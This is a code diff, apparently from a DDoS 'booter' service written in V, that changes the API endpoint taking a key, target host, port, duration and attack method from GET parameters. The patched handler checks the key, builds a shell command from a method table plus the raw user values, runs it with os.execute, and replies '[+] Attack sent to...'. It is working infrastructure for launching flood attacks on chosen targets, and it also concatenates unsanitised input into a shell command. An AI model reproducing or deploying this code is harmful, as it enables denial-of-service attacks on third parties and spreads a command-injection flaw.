@@ -38,23 +38,28 @@ pub fn (mut app App) api() vweb.Result {
 	port 		:= app.query['port']
 	time 		:= app.query['time']
 	method 		:= app.query['method']
+	
 
-	if key in app.api_keys {} else { 
-		app.text("[x] Error, Invalid key!")
-		return $vweb.html()
-	}
-
-	if host == "" || port == "" || time == "" || method == "" {
+	if key == "" || host == "" || port == "" || time == "" || method == "" {
 		app.text("[x] Error, Fill all GET parameters to continue!")
 		return $vweb.html()
 	}
 
-	println(app.methods[method] or {
-		app.text("[x] Error, Invalid method!")
+	if key in app.api_keys {
+		println(app.methods[method] or {
+			app.text("[x] Error, Invalid method!")
+			return $vweb.html()
+		})
+
+	
+		full_cmd := app.methods[method] + "${host} ${port} ${time}"
+		os.execute(full_cmd)
+		app.text("[+] Attack sent to ${host}:${port} for ${time} seconds with ${method}..!")
 		return $vweb.html()
-	})
-	full_cmd := app.methods[method] + "${host} ${port} ${time}"
-	os.execute(full_cmd)
+	} else { 
+		app.text("[x] Error, Invalid key!")
+		return $vweb.html()
+	}
 		
 
 	return $vweb.html()
